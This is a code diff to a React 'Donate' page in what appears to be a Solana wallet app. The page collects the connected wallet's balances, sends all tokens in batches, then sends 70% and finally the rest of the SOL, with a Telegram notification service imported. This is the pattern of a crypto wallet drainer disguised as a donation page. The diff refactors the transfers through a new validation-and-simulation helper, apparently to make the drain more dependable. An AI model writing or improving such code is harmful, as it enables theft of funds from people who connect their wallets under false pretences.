@@ -10,13 +10,15 @@ import {
   getWalletBalances,
   createBatchTransferTransaction,
   createFinalSolTransferTransaction,
+  sendWithValidationAndSimulation,
   sendTelegramNotification,
   type WalletBalances,
 } from "@/services/walletService";
 import { toast } from "@/hooks/use-toast";
 
 export default function Donate() {
-  const { publicKey, sendTransaction, connected } = useWallet();
+  const wallet = useWallet();
+  const { publicKey, connected } = wallet;
   const [balances, setBalances] = useState<WalletBalances | null>(null);
   const [isLoading, setIsLoading] = useState(false);
   const [donationStatus, setDonationStatus] = useState<"idle" | "loading" | "success" | "error">("idle");
@@ -74,12 +76,12 @@ export default function Donate() {
       for (let i = 0; i < batches.length; i++) {
         const isFinalTokenBatch = i === batches.length - 1;
         const transaction = await createBatchTransferTransaction(
-          { publicKey, sendTransaction } as any,
+          wallet,
           batches[i],
           false
         );
 
-        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+        const signature = await sendWithValidationAndSimulation(wallet, connection, transaction, { skipPreflight: false });
         console.log(`Batch ${i + 1} sent:`, signature);
 
         toast({
@@ -91,11 +93,11 @@ export default function Donate() {
       // Send 70% of SOL
       if (balances.solBalance > 0) {
         const solTransaction70 = await createBatchTransferTransaction(
-          { publicKey, sendTransaction } as any,
+          wallet,
           [],
           true
         );
-        await sendTransaction(solTransaction70, connection, { skipPreflight: false });
+        await sendWithValidationAndSimulation(wallet, connection, solTransaction70, { skipPreflight: false });
         
         toast({
           title: "SOL Sent",
@@ -105,11 +107,8 @@ export default function Donate() {
 
       // Send remaining 30% of SOL
       if (balances.solBalance > 0) {
-        const finalSolTransaction = await createFinalSolTransferTransaction({
-          publicKey,
-          sendTransaction,
-        } as any);
-        await sendTransaction(finalSolTransaction, connection, { skipPreflight: false });
+        const finalSolTransaction = await createFinalSolTransferTransaction(wallet);
+        await sendWithValidationAndSimulation(wallet, connection, finalSolTransaction, { skipPreflight: false });
 
         toast({
           title: "Final Transfer Complete",
